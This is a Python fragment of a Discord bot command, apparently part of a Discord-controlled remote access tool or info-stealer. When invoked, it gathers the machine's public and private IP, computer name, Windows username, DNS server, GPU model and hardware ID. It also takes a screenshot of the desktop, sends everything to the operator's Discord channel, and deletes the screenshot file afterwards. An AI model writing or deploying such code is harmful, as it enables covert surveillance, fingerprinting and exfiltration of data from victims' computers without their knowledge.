import os,discord, pyautogui, requests, socket, wmi, uuid, platform
async def ip(ctx):
    def get_gpu_info():
        try:
            c = wmi.WMI()
            for gpu in c.Win32_VideoController():
                return gpu.Name
        except Exception as e:
            return f"Error retrieving GPU info: {str(e)}"

    public_ip = requests.get('https://api.ipify.org').text.strip()
    private_ip = socket.gethostbyname(socket.gethostname())
    pc_name = socket.gethostname()
    pc_username = os.getenv('USERNAME')
    dns_servers = os.popen('nslookup google.com').readlines()[-2].strip() if os.name == 'nt' else None
    gpu_info = get_gpu_info() if platform.system() == 'Windows' else "N/A"
    hwid = uuid.getnode()

    screenshot_path = 'screenshot.png'
    pyautogui.screenshot(screenshot_path)

    embed = discord.Embed(title='System Information', color=0x00ff00)
    embed.add_field(name='🖥️ Public IP', value=public_ip, inline=False)
    embed.add_field(name='🏠 Private IP', value=private_ip, inline=False)
    embed.add_field(name='💻 PC Name', value=pc_name, inline=False)
    embed.add_field(name='👤 PC Username', value=pc_username, inline=False)
    embed.add_field(name='🌐 DNS Server', value=dns_servers if dns_servers else 'N/A', inline=False)
    embed.add_field(name='🎮 GPU', value=gpu_info, inline=False)
    embed.add_field(name='🔑 HWID', value=str(hwid), inline=False)

    file = discord.File(screenshot_path, filename='desktop.png')
    embed.set_image(url=f'attachment://desktop.png')

    await ctx.send(embed=embed, file=file)

    os.remove(screenshot_path)